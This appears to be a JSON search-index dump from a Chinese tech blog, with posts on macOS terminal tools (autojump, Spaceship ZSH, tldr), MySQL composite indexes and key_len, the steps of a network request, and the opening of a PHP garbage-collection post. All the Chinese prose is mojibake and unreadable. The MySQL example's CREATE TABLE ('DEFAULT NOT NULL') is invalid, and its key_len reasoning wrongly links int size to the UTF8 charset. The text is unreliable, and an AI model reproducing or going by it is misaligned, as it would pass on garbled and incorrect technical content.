éƒ½èƒ½ä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè¿™æ˜¯ä»…ä»‹ç»macOS çš„å®‰è£…æ–¹å¼ã€‚ 1brew install autojump ä½¿ç”¨brewå®‰è£…å®Œæˆä¹‹åï¼Œè¿˜éœ€è¦è¿›è¡Œé…ç½®ï¼Œä»¥ä¸‹æ–¹æ³•äºŒé€‰ä¸€ï¼š åœ¨ ~/.bash_profile æ–‡ä»¶ä¸­åŠ å…¥è¯­å¥ [[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.shã€‚ åœ¨ ~/.zshrc æ–‡ä»¶ä¸­ï¼Œä¿®æ”¹ plugins=(git) æ’ä»¶é…ç½®è¡Œï¼Œä»¥å¼€å¯ zsh å¯¹ autojump æ’ä»¶çš„æ”¯æŒ plugins=(git autojump)ã€‚ å¸¸ç”¨å‘½ä»¤ å‘½ä»¤ æè¿° j foo è·³è½¬åˆ°åŒ…å« foo çš„ç›®å½• jc bar è·³è½¬åˆ°åŒ…å« bar çš„å­ç›®å½• jo file åœ¨è®¿è¾¾ä¸­æ‰“å¼€åŒ…å« file çš„ç›®å½• autojump â€“help æ‰“å¼€å¸®åŠ©åˆ—è¡¨ Spaceship ZSHSpaceship ZSHâ€”â€”æ˜¯ä¸€ä¸ªæç®€ã€å¼ºå¤§å’Œå¯å®šåˆ¶çš„ZSHæç¤ºç¬¦ã€‚ æˆ‘æ˜¯åœ¨æ— æ„é—´å‘ç°çš„è¿™ä¸ªç»ˆç«¯å·¥å…·çš„ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹å®é™…æ•ˆæœã€‚ ç‰¹ç‚¹Spaceship ZSH æœ‰å¾ˆå¤šå¾ˆæ£’çš„ç‰¹ç‚¹ï¼Œè¿™é‡Œä»…ä»…åˆ—ä¸¾ä¸€äº›æˆ‘æ‰€çœ‹è§çš„ã€‚ é¢œå€¼å³æ­£ä¹‰ å±•ç¤ºå½“å‰Git ä»“åº“çš„çŠ¶æ€ å±•ç¤ºå„ç§è¯­è¨€çš„å½“å‰ç‰ˆæœ¬ å±•ç¤ºæœ€åä¸€æ¡å‘½ä»¤çš„æ€»æ‰§è¡Œæ—¶é—´ å®‰è£…Spaceship ZSH çš„å®‰è£…æ–¹å¼æœ‰å¤šç§ï¼Œè¿™é‡Œä»…ä»‹ç»é€šè¿‡oh-my-zshçš„å®‰è£…æ–¹å¼ï¼Œå…¶ä»–æ–¹å¼å¯å‚è€ƒå®˜ç½‘ã€‚ å…‹éš†ä»“åº“1git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot; å°†spaceship.zsh-theme é“¾æ¥åˆ°oh-my-zsh çš„ä¸»é¢˜ç›®å½•1ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh-theme&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot; ç¼–è¾‘~/.zshrc1ZSH_THEME&#x3D;&quot;spaceship&quot; tldrtldr æ˜¯ä¸€ä¸ªæ¯”man æ›´å¥½ç”¨çš„å‘½ä»¤è¡Œæ‰‹å†Œã€‚ å®ƒè¡ç”Ÿå‡ºäº†å„ç§è¯­è¨€çš„å®¢æˆ·ç«¯ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨å®˜ç½‘æ¨èçš„æ–¹å¼è¿›è¡Œå®‰è£…ï¼š 1npm install -g tldr å®‰è£…å®Œæˆä¹‹åï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨tldrå‘½ä»¤éœ€è¦ä¸‹è½½ç›¸å…³ä¾èµ–ï¼š 123tldr tarPage not found. Updating cache...Error: connect ECONNREFUSED 127.0.0.1:443 å¦‚æœå‡ºç°ä¸Šé¢è¿™ä¸ªè¾“å‡ºï¼Œè¡¨ç¤ºå‘½ä»¤è¡Œéœ€è¦ä½¿ç”¨ä»£ç†ï¼Œå¦‚æœä¸çŸ¥é“å¦‚ä½•è®¾ç½®ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡ç¬”è®°ã€‚ æ­£å¸¸è¾“å‡ºå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233tldr tarâœ” Page not found. Updating cache...âœ” Creating index... tar Archiving utility. Often combined with a compression method, such as gzip or bzip. More information: https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;tar. - [c]reate an archive from [f]iles: tar cf target.tar file1 file2 file3 - [c]reate a g[z]ipped archive from [f]iles: tar czf target.tar.gz file1 file2 file3 - [c]reate a g[z]ipped archive from a directory using relative paths: tar czf target.tar.gz --directory&#x3D;path&#x2F;to&#x2F;directory . - E[x]tract a (compressed) archive [f]ile into the current directory: tar xf source.tar[.gz|.bz2|.xz] - E[x]tract a (compressed) archive [f]ile into the target directory: tar xf source.tar[.gz|.bz2|.xz] --directory&#x3D;directory - [c]reate a compressed archive from [f]iles, using [a]rchive suffix to determine the compression program: tar caf target.tar.xz file1 file2 file3 - Lis[t] the contents of a tar [f]ile [v]erbosely: tar tvf source.tar - E[x]tract [f]iles matching a pattern: tar xf source.tar --wildcards &quot;*.html&quot; ä¸Šé¢é‚£ä¸ªnode çš„å®¢æˆ·ç«¯ä¸æ˜¯äº¤äº’å¼çš„ï¼Œå¦‚æœéœ€è¦è‡ªåŠ¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ tldr++ï¼Œè¿™æ˜¯ä¸€ä¸ªGo è¯­è¨€ç¼–å†™çš„äº¤äº’å¼å®¢æˆ·ç«¯ã€‚ å‚è€ƒé“¾æ¥ å®‰è£… zsh å¦‚ä½•å¯ç”¨ zsh çš„æ’ä»¶ OSX æ’ä»¶ Spaceship ZSH autojumpâ€”â€”è‡ªåŠ¨è·³è½¬æ–‡ä»¶ç›®å½• tldrâ€”â€”æ¯”man æ›´å¥½ç”¨çš„å‘½ä»¤è¡Œæ‰‹å†Œ","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Mac","slug":"Tutorial/Mac","permalink":"https://www.0x2beace.com/categories/Tutorial/Mac/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mysql ç´¢å¼•è®¾è®¡ä¸ä¼˜åŒ–","slug":"mysql-index-design-and-optimization","date":"2021-01-10T13:12:04.000Z","updated":"2021-01-10T13:13:04.486Z","comments":true,"path":"mysql-index-design-and-optimization/","link":"","permalink":"https://www.0x2beace.com/mysql-index-design-and-optimization/","excerpt":"ä»€ä¹ˆæ˜¯ç´¢å¼•ï¼Ÿ","text":"ä»€ä¹ˆæ˜¯ç´¢å¼•ï¼Ÿ æ•°æ®åº“ç´¢å¼•æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒä»¥é¢å¤–çš„å†™å…¥å’Œå­˜å‚¨ç©ºé—´ä¸ºä»£ä»·æ¥æé«˜æ•°æ®åº“è¡¨ä¸Šæ•°æ®æ£€ç´¢æ“ä½œçš„é€Ÿåº¦ã€‚é€šä¿—æ¥è¯´ï¼Œç´¢å¼•ç±»ä¼¼äºä¹¦çš„ç›®å½•ï¼Œæ ¹æ®å…¶ä¸­è®°å½•çš„é¡µç å¯ä»¥å¿«é€Ÿæ‰¾åˆ°æ‰€éœ€çš„å†…å®¹ã€‚â€”â€”ç»´åŸºç™¾ç§‘ å¸¸è§ç´¢å¼•æœ‰å“ªäº›ï¼Ÿ æ™®é€šç´¢å¼•ï¼šæœ€åŸºæœ¬çš„ç´¢å¼•ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ å”¯ä¸€ç´¢å¼•ï¼šä¸â€æ™®é€šç´¢å¼•â€œç±»ä¼¼ï¼Œä¸åŒçš„å°±æ˜¯ï¼šç´¢å¼•åˆ—çš„å€¼å¿…é¡»æ˜¯å”¯ä¸€ï¼Œä½†å…è®¸æœ‰ç©ºå€¼ ä¸»é”®ç´¢å¼•ï¼šå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„ç´¢å¼•ï¼Œä¸å…è®¸æœ‰ç©ºå€¼ å…¨æ–‡ç´¢å¼•ï¼šä»…å¯ç”¨äº MyISAM è¡¨ï¼Œé’ˆå¯¹è¾ƒå¤§çš„æ•°æ®ï¼Œç”Ÿæˆå…¨æ–‡ç´¢å¼•å¾ˆè€—æ—¶å ç©ºé—´ ç»„åˆç´¢å¼•ï¼šä¸ºäº†æé«˜å¤šæ¡ä»¶æŸ¥è¯¢æ•ˆç‡ï¼Œå¯å»ºç«‹ç»„åˆç´¢å¼•ï¼Œéµå¾ªâ€æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™â€œ è¿™é‡Œä»¥ç›¸å¯¹å¤æ‚çš„ç»„åˆä¸ºä¾‹ï¼Œä»‹ç»å¦‚ä½•ä¼˜åŒ–ã€‚ æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ä»€ä¹ˆæ˜¯æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ã€‚ æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™æ˜¯æŒ‡åœ¨ä½¿ç”¨ B+Tree è”åˆç´¢å¼•è¿›è¡Œæ•°æ®æ£€ç´¢æ—¶ï¼ŒMySQL ä¼˜åŒ–å™¨ä¼šè¯»å–è°“è¯ï¼ˆè¿‡æ»¤æ¡ä»¶ï¼‰å¹¶æŒ‰ç…§è”åˆç´¢å¼•å­—æ®µåˆ›å»ºé¡ºåºä¸€ç›´å‘å³åŒ¹é…ç›´åˆ°é‡åˆ°èŒƒå›´æŸ¥è¯¢æˆ–éç­‰å€¼æŸ¥è¯¢ååœæ­¢åŒ¹é…ï¼Œæ­¤å­—æ®µä¹‹åçš„ç´¢å¼•åˆ—ä¸ä¼šè¢«ä½¿ç”¨ï¼Œè¿™æ—¶è®¡ç®— key_len å¯ä»¥åˆ†æå‡ºè”åˆç´¢å¼•å®é™…ä½¿ç”¨äº†å“ªäº›ç´¢å¼•åˆ—ã€‚ å¦‚ä½•è®¡ç®— key_lené€šè¿‡ key_len è®¡ç®—ä¹Ÿå¸®åŠ©æˆ‘ä»¬äº†è§£ç´¢å¼•çš„æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ã€‚ key_len è¡¨ç¤ºå¾—åˆ°ç»“æœé›†æ‰€ä½¿ç”¨çš„é€‰æ‹©ç´¢å¼•çš„é•¿åº¦[å­—èŠ‚æ•°]ï¼Œä¸åŒ…æ‹¬ order byï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœ order by ä¹Ÿä½¿ç”¨äº†ç´¢å¼•åˆ™ key_len ä¸è®¡ç®—åœ¨å†…ã€‚ åœ¨è®¡ç®— key_len ä¹‹å‰ï¼Œå…ˆæ¥æ¸©ä¹ ä¸€ä¸‹åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆä»¥UTF8 ç¼–ç ä¸ºä¾‹ï¼‰ï¼š|ç±»å‹|æ‰€å ç©ºé—´|ä¸å…è®¸ä¸ºNULLé¢å¤–å ç”¨||-|-|-||char|ä¸€ä¸ªå­—ç¬¦ä¸‰ä¸ªå­—èŠ‚|ä¸€ä¸ªå­—èŠ‚||varchar|ä¸€ä¸ªå­—ç¬¦ä¸‰ä¸ªå­—èŠ‚|ä¸€ä¸ªå­—èŠ‚||int|å››ä¸ªå­—èŠ‚|ä¸€ä¸ªå­—èŠ‚||tinyint|ä¸€ä¸ªå­—èŠ‚|ä¸€ä¸ªå­—èŠ‚| æµ‹è¯•æ•°æ®è¡¨å¦‚ä¸‹ï¼š 12345678CREATE TABLE &#96;test_table&#96; ( &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT, &#96;a&#96; int(11) DEFAULT NOT NULL, &#96;b&#96; int(11) DEFAULT NOT NULL, &#96;c&#96; int(11) DEFAULT NOT NULL, PRIMARY KEY (&#96;id&#96;), KEY &#96;test_table_a_b_c_index&#96; (&#96;a&#96;,&#96;b&#96;,&#96;c&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; å‘½ä¸­ç´¢å¼•ï¼š 123456mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| 1 | SIMPLE | test_table | NULL | ref | test_table_a_b_c_index | test_table_a_b_c_index | 12 | const,const,const | 1 | 100.00 | Using index |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+ å¯ä»¥çœ‹åˆ° key_len = 12ï¼Œè¿™æ˜¯å¦‚ä½•è®¡ç®—çš„å‘¢ï¼Ÿå› ä¸ºå­—ç¬¦é›†æ˜¯ UTF8ï¼Œä¸€ä¸ªå­—æ®µå ç”¨å››ä¸ªå­—èŠ‚ï¼Œä¸‰ä¸ªå­—æ®µå°±æ˜¯ 4 * 3 = 12 å­—èŠ‚ã€‚ æ˜¯å¦å…è®¸ä¸º NULLï¼Œå¦‚æœå…è®¸ä¸º NULLï¼Œåˆ™éœ€è¦ç”¨é¢å¤–çš„å­—èŠ‚æ¥æ ‡è®°è¯¥å­—æ®µï¼Œä¸åŒçš„æ•°æ®ç±»å‹æ‰€éœ€çš„å­—èŠ‚å¤§å°ä¸åŒã€‚ 123456789mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;a&#96; &#96;a&#96; INT(11) NULL;mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;c&#96; &#96;c&#96; INT(11) NULL;mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;b&#96; &#96;b&#96; INT(11) NULL;mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| 1 | SIMPLE | test_table | NULL | ref | test_table_a_b_c_index | test_table_a_b_c_index | 15 | const,const,const | 1 | 100.00 | Using index |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+ å¯ä»¥çœ‹åˆ°ï¼Œå½“å­—æ®µå…è®¸ä¸ºç©ºæ—¶ï¼Œè¿™æ—¶çš„key_len å˜æˆäº†15 = 4 * 3 + 1 * 3ï¼ˆINT ç±»å‹ä¸ºç©ºæ—¶ï¼Œé¢å¤–å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼‰ã€‚ ç´¢å¼•ä¼˜åŒ–æœ‰äº†è¿™äº›åŸºç¡€çŸ¥è¯†ä¹‹åï¼Œå†æ¥æ ¹æ®å®é™…çš„SQL åˆ¤æ–­ç´¢æ€§æ€§èƒ½å¥½åã€‚ è¿˜æ˜¯ä»¥ä¸Šé¢é‚£å¼ æ•°æ®è¡¨ä¸ºä¾‹ï¼Œä¸º aã€bã€c ä¸‰ä¸ªå­—æ®µåˆ›å»ºè”åˆç´¢å¼•ã€‚|SQL è¯­å¥|æ˜¯å¦ç´¢å¼•||-|-||explain select * from test_table where a = 1 and b = 2 and c = 3;|Extra:Using index key_len: 15||explain select * from test_table where a = 1 and b = 2 and c = 3 order by c;|Extra:Using index key_len: 15||explain select * from test_table where b = 2 and c = 3;|Extra:Using where; Using index key_len: 15||explain select * from test_table where a = 1 order by c;|Extra:Using where; Using index; Using filesort key_len: 5||explain select * from test_table order by a, b, c;|Extra:Using index key_len: 15||explain select * from test_table order by a, b, c desc;|Extra:Using index; Using filesort key_len:15||explain select * from test_table where a in (1,2) and b in (1,2,3) and c = 1;|Extra:Using where; Using index key_len: 15| é€šå¸¸åœ¨æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’æ—¶ï¼Œ Extra åˆ—ä¸º Using index åˆ™è¡¨ç¤ºä¼˜åŒ–å™¨ä½¿ç”¨äº†è¦†ç›–ç´¢å¼•ã€‚ SQL1 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œæ€§èƒ½å¥½ SQL2 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼ŒåŒæ—¶é¿å…æ’åºï¼Œæ€§èƒ½å¥½ SQL3 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œä½†æ˜¯éœ€è¦æ ¹æ® where å­—å¥è¿›è¡Œè¿‡æ»¤ SQL4 å¯ä»¥ä½¿ç”¨éƒ¨åˆ†ç´¢å¼• aï¼Œä½†æ— æ³•é¿å…æ’åºï¼Œæ€§èƒ½å·® SQL5 å¯ä»¥å®Œå…¨ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼ŒåŒæ—¶å¯ä»¥é¿å…æ’åºï¼Œæ€§èƒ½å¥½ SQL6 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œä½†æ— æ³•é¿å…æ’åºï¼Œï¼ˆè¿™æ˜¯å› ä¸º MySQL InnoDB åˆ›å»ºç´¢å¼•æ—¶é»˜è®¤ascå‡åºï¼Œç´¢å¼•æ— æ³•è‡ªåŠ¨å€’åºæ’åºï¼‰ SQL7 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œä½†æ˜¯éœ€è¦æ ¹æ® where å­å¥è¿›è¡Œè¿‡æ»¤ï¼ˆéå®šå€¼æŸ¥è¯¢ï¼‰ åˆ›å»ºç´¢å¼•è§„èŒƒ è€ƒè™‘åˆ°ç´¢å¼•ç»´æŠ¤çš„æˆæœ¬ï¼Œå•å¼ è¡¨çš„ç´¢å¼•æ•°é‡ä¸è¶…è¿‡ 5 ä¸ªï¼Œå•ä¸ªç´¢å¼•ä¸­çš„å­—æ®µæ•°ä¸è¶…è¿‡ 5 ä¸ª ä¸åœ¨ä½åŸºæ•°åˆ—ä¸Šå»ºâ½´ç´¢å¼•ï¼Œä¾‹å¦‚â€œæ€§åˆ«â€ã€‚ åœ¨ä½åŸºæ•°åˆ—ä¸Šåˆ›å»ºçš„ç´¢å¼•æŸ¥è¯¢ç›¸æ¯”å…¨è¡¨æ‰«æä¸ä¸€å®šæœ‰æ€§èƒ½ä¼˜åŠ¿ï¼Œç‰¹åˆ«æ˜¯å½“å­˜åœ¨å›è¡¨æˆæœ¬æ—¶ã€‚ åˆç†åˆ›å»ºè”åˆç´¢å¼•ï¼Œ(a,b,c) ç›¸å½“äº (a) ã€(a,b) ã€(a,b,c)ã€‚ åˆç†ä½¿ç”¨è¦†ç›–ç´¢å¼•å‡å°‘IOï¼Œé¿å…æ’åºã€‚ å‚è€ƒé“¾æ¥ Explainä¹‹key_lené•¿åº¦è®¡ç®—","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"ä¸€æ¬¡å®Œæ•´çš„ç½‘ç»œè¯·æ±‚è¿‡ç¨‹","slug":"a-complete-network-request-process","date":"2021-01-06T15:41:25.000Z","updated":"2021-02-25T11:54:22.940Z","comments":true,"path":"a-complete-network-request-process/","link":"","permalink":"https://www.0x2beace.com/a-complete-network-request-process/","excerpt":"åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ www.0xbeace.com è¿™ä¸ªåŸŸåï¼Œç„¶åå°±èƒ½çœ‹åˆ°ç²¾ç¾çš„é¡µé¢äº†ï¼Œè¿™ä¸­é—´å€’åº•å‘ç”Ÿäº†äº›ä»€ä¹ˆå‘¢ï¼Ÿ","text":"åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ www.0xbeace.com è¿™ä¸ªåŸŸåï¼Œç„¶åå°±èƒ½çœ‹åˆ°ç²¾ç¾çš„é¡µé¢äº†ï¼Œè¿™ä¸­é—´å€’åº•å‘ç”Ÿäº†äº›ä»€ä¹ˆå‘¢ï¼Ÿ å…¶æ•´ä¸ªè¿‡ç¨‹å¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š DNS åŸŸåè§£æï¼Œå¯»æ‰¾å¯¹åº”çš„IP åœ°å€ æ ¹æ®è¿™ä¸ªIP æ‰¾åˆ°å¯¹åº”çš„æœåŠ¡å™¨ï¼Œå»ºç«‹TCP è¿æ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰ TCP å»ºè¿ä¹‹åï¼Œå‘èµ·HTTP è¯·æ±‚ æœåŠ¡å™¨å“åº” HTTP è¯·æ±‚ å®¢æˆ·ç«¯æ¥æ”¶æ•°æ®è§£æå¹¶æ¸²æŸ“é¡µé¢ æœåŠ¡å™¨å…³é—­TCP è¿æ¥ï¼ˆå››æ¬¡æŒ¥æ‰‹ï¼‰ åŸŸåè§£æä»¥0xbeace.comè¿™ä¸ªåŸŸåä¸ºä¾‹ï¼ŒDNS åŸŸåè§£æå¤§è‡´å¯ä»¥ç»†åˆ†æˆä»¥ä¸‹å‡ ä¸ªå°æ­¥éª¤ï¼š DNS ç¼“å­˜ï¼ˆè¿™é‡Œçš„ç¼“å­˜åˆ†ä¸ºæµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿï¼‰ æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼ˆHosts æ–‡ä»¶ï¼‰ æ ¹åŸŸåæœåŠ¡å™¨ COM é¡¶çº§åŸŸåæœåŠ¡å™¨ 0xbeace.com åŸŸåæœåŠ¡å™¨ åŸŸåè§£æä¸€èˆ¬å°±æ˜¯æŒ‰ç…§è¯¥è¿‡ç¨‹å»æŸ¥æ‰¾ï¼Œè¿™é‡Œå¼•ç”¨ä¸€å¼ å›¾ï¼ˆæ²¡æ‰¾åˆ°å…·ä½“å‡ºå¤„ï¼‰ï¼Œæ›´åŠ é€šä¿—æ˜“æ‡‚åœ°è§£é‡Šäº†å®Œæ•´åœ°è§£æè¿‡ç¨‹ã€‚ DNS åŸŸåè§£æè¯¦ç»†è¿‡ç¨‹ TCP å»ºè¿å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚TCP è¿æ¥æˆåŠŸä¹‹åï¼Œå°±å¯ä»¥æŒ‰ç…§å›ºå®šæ ¼å¼å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚äº†ã€‚ ä¸€ä¸ªå®Œæ•´çš„ HTTP è¯·æ±‚åº”è¯¥åŒ…å«ä»¥ä¸‹å‡ éƒ¨åˆ†ï¼š è¯·æ±‚è¡Œï¼šç”¨äºæè¿°å®¢æˆ·ç«¯çš„è¯·æ±‚æ–¹å¼ï¼ˆGET/POSTç­‰ï¼‰ï¼Œè¯·æ±‚çš„èµ„æºåç§°(URL)ä»¥åŠä½¿ç”¨çš„HTTPåè®®çš„ç‰ˆæœ¬å· è¯·æ±‚å¤´ï¼šç”¨äºæè¿°å®¢æˆ·ç«¯è¯·æ±‚å“ªå°ä¸»æœºåŠå…¶ç«¯å£ï¼Œä»¥åŠå®¢æˆ·ç«¯çš„èº«ä»½ä¿¡æ¯ï¼ˆUser-Agentï¼‰ç­‰ è¯·æ±‚æ­£æ–‡ï¼šå®¢æˆ·ç«¯éœ€è¦å‘é€ç»™æœåŠ¡ç«¯çš„æ•°æ® æœåŠ¡ç«¯å“åº”è¯·æ±‚å®¢æˆ·ç«¯æˆåŠŸå‘èµ·è¯·æ±‚ä¹‹åï¼Œå®¢æˆ·ç«¯æ¥æ”¶è¯·æ±‚å¹¶å¤„ç†å°†ç»“æœå“åº”è‡³å®¢æˆ·ç«¯ã€‚ ä¸€ä¸ªå®Œæ•´çš„ HTTP å“åº”åº”è¯¥åŒ…å«ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š çŠ¶æ€è¡Œï¼šå¦‚ï¼šHTTP/1.1 200 okï¼Œåˆ†åˆ«è¡¨ç¤º httpç‰ˆæœ¬ + çŠ¶æ€ç  + çŠ¶æ€ä»£ç çš„æ–‡æœ¬æè¿° å“åº”å¤´ï¼šåŒ…å«æœåŠ¡å™¨ç›¸å…³ä¿¡æ¯ å“åº”æ­£æ–‡ï¼šæœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯çš„æ•°æ® å®¢æˆ·ç«¯æ¸²æŸ“è¿™é‡Œä»¥æœ€å¸¸è§çš„ .html æ–‡ä»¶ä¸ºä¾‹ï¼Œå½“å®¢æˆ·ç«¯æ¥æ”¶åˆ°å“åº”æ•°æ®ä¹‹åï¼Œä¾¿å¼€å§‹è§£æ HTMLï¼Œå¦‚æœé‡åˆ°js/cssè¿™ç±»é™æ€èµ„æºï¼Œå°±ä¼šå‘æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªHTTP è¯·æ±‚ï¼Œå¦‚æœè¯¥è¯·æ±‚çš„è¿”å›çŠ¶æ€ç æ˜¯ 304ï¼ˆå·²ç»ç¼“å­˜åœ¨æœ¬åœ°æµè§ˆå™¨äº†ï¼‰ï¼Œå°±ä¼šç›´æ¥ä»ç¼“å­˜ä¸­è·å–ï¼Œå¦åˆ™å°±ä¼šå¼€å¯æ–°çš„çº¿ç¨‹å»å‘æœåŠ¡å™¨è¯·æ±‚ä¸‹è½½ã€‚ è¿™æ—¶å°±ç”¨åˆ°äº† keep-alive è¿™ä¸ªç‰¹æ€§ï¼Œå¯ä»¥å»ºç«‹ä¸€æ¬¡TCP è¿æ¥ï¼Œå‘èµ·å¤šæ¬¡ HTTP è¯·æ±‚ã€‚ ç„¶åæµè§ˆå™¨å†åˆ©ç”¨è‡ªå·±çš„å†…éƒ¨å·¥ä½œæœºåˆ¶ï¼Œå°†HTML ä¸é™æ€èµ„æºè¿›è¡Œæ¸²æŸ“ï¼Œæœ€åå‘ˆç°ç»™ç”¨æˆ·ã€‚ TCP å…³é—­è¿æ¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å®Œæˆä¸€æ¬¡è¯·æ±‚ï¼Œå°±ä¼šå…³é—­TCP è¿æ¥ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡åˆéœ€è¦å‘èµ· HTTP è¯·æ±‚æ—¶ï¼Œå°±éœ€è¦å†æ¬¡å»ºç«‹ä¸€æ¬¡TCP è¿æ¥äº†ã€‚ é¢‘ç¹å»ºç«‹/å…³é—­è¿æ¥ï¼Œä¸ä»…å¢åŠ äº†è¯·æ±‚å“åº”æ—¶é—´ï¼Œè¿˜é¢å¤–å¢åŠ äº†ç½‘ç»œå¸¦å®½æ¶ˆè€—ï¼Œæ‰€ä»¥HTTP åè®®ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå¯ä»¥ä¿æŒTCP çš„é€šç”¨æ¶ˆæ¯å¤´ï¼š 1Connection:keep-alive è‡³æ­¤ä¸€ä¸ªå®Œæ•´çš„HTTP è¯·æ±‚å°±å®Œæˆäº†ã€‚ å…¶ä»–é—®é¢˜ä¸ºä»€ä¹ˆHTTP åè®®è¦åŸºäºTCP æ¥å®ç°è¿™æ˜¯å› ä¸ºTCP æ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯çš„é¢å‘è¿æ¥çš„åè®®ï¼ŒHTTPåŸºäºä¼ è¾“å±‚TCPåè®®ä¸ç”¨æ‹…å¿ƒæ•°æ®ä¼ è¾“çš„å„ç§é—®é¢˜ï¼ˆå½“å‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šé‡ä¼ ï¼‰ã€‚ å‚è€ƒé“¾æ¥ ä¸€æ¬¡å®Œæ•´çš„HTTPè¯·æ±‚è¿‡ç¨‹ ä¸€æ¬¡å®Œæ•´çš„ç½‘ç»œè¯·æ±‚æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"PHP åƒåœ¾å›æ”¶æœºåˆ¶","slug":"php-garbage-collection-mechanism","date":"2021-01-04T14:44:06.000Z","updated":"2021-02-03T08:32:46.856Z","comments":true,"path":"php-garbage-collection-mechanism/","link":"","permalink":"https://www.0x2beace.com/php-garbage-collection-mechanism/","excerpt":"PHP æ˜¯ä¸€é—¨æ‰˜ç®¡å‹è¯­è¨€ï¼Œåœ¨PHP ç¼–ç¨‹æ—¶ï¼Œç¨‹åºå‘˜ä¸éœ€è¦æ‰‹åŠ¨å¤„ç†å†…å­˜èµ„æºçš„åˆ†é…å’Œé‡Šæ”¾ï¼Œè¿™å°±æ„å‘³ç€ PHP æœ¬èº«å®ç°äº†åƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆGarbage Collectionï¼‰ã€‚","text":"PHP æ˜¯ä¸€é—¨æ‰˜ç®¡å‹è¯­è¨€ï¼Œåœ¨PHP ç¼–ç¨‹æ—¶ï¼Œç¨‹åºå‘˜ä¸éœ€è¦æ‰‹åŠ¨å¤„ç†å†…å­˜èµ„æºçš„åˆ†é…å’Œé‡Šæ”¾ï¼Œè¿™å°±æ„å‘³ç€ PHP 